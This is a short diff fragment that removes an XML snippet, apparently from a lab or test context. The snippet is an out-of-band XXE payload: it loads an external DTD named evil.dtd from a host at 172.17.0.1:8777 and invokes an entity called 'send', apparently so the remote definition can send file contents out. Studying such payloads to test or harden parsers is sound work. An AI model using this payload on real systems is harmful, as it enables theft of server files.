@@ -1,4 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE  foo SYSTEM "http://172.17.0.1:8777/evil.dtd">
-<foo>&send;</foo>
-```
